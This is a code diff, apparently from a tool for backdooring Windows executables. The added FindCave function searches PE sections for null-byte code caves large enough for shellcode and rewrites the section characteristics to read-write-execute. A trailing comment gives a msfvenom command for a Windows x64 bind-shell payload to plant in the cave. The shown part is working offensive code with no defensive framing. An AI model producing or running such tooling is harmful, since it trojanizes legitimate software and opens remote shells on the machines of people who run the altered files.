@@ -29,6 +29,94 @@ def AslrStatus():
     else:
         print (" ASLR: \t\t\tDisabled\n")
         return False
+   
+# Identifies code cave of specified size (min shellcode + 20 padding)
+# Returns the Virtual and Raw addresses
+def FindCave():
+
+    global aslr
+    global pe
+    global x64
+
+    # ASLR Check
+    aslr = AslrStatus()
+
+    # If ASLR was enabled, open the new file for working
+    if aslr:
+        filedata = open(newFile, "rb")
+        pe = pefile.PE(newFile)
+
+    else:
+        filedata = open(file, "rb")
+
+    print(" Min Cave Size: \t\t" + str(minCave) + " bytes")
+
+    # Set PE file Image Base
+    image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)
+
+    # Print Number of Section Headers
+    print(" Number of Sections: \t" + str(pe.FILE_HEADER.NumberOfSections))
+
+    caveFound = False
+
+    # Loop through sections to identify code cave of minimum bytes
+    for section in pe.sections:
+        sectionCount = 0
+
+        print(" Checking Section: \t\t" + section.Name.decode())
+
+        if section.SizeOfRawData != 0:
+            position = 0
+            count = 0
+
+            filedata.seek(section.PointerToRawData, 0)
+            data = filedata.read(section.SizeOfRawData)
+
+            for byte in data:
+                position += 1
+
+                if byte == 0x00:
+                    count += 1
+                else:
+
+
+                    if args.info is False:
+                        if count > minCave:
+                            caveFound = True
+                            raw_addr = section.PointerToRawData + position - count - 1
+                            vir_addr = image_base_hex + section.VirtualAddress + position - count - 1
+
+                            print(" Code Cave:")
+                            print("\tSection: \t\t%s" % section.Name.decode())
+                            print ("\tSize: \t\t\t%d bytes" % count)
+                            print ("\tRaw: \t\t\t0x%08X" % raw_addr)
+                            print ("\tVirtual: \t\t0x%08X" % vir_addr)
+                            print("\tCharacteristics: \t" + hex(section.Characteristics))
+
+                            if args.info is False:
+                                # Set section header characteristics ## RWX
+                                section.Characteristics = 0xE0000040
+                                print("\tNew Characteristics: \t" + "0xE0000040\n")
+
+                            return vir_addr, raw_addr
+
+                    else:
+                        # Min 64 bytes for check
+                        if count > 64:
+                            raw_addr = section.PointerToRawData + position - count - 1
+                            vir_addr = image_base_hex + section.VirtualAddress + position - count - 1
+
+                            print(" Code Cave:")
+                            print("\tSection: \t\t%s" % section.Name.decode())
+                            print("\tSize: \t\t\t%d bytes" % count)
+                            print("\tRaw: \t\t\t0x%08X" % raw_addr)
+                            print("\tVirtual: \t\t0x%08X" % vir_addr)
+                            print("\tCharacteristics: \t" + hex(section.Characteristics))
+
+                    count = 0
+        sectionCount += 1
+
+    filedata.close()
 
 #shellcode 64bits
 # msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 EXITFUNC=none -b '\x00' -i 0 -f c
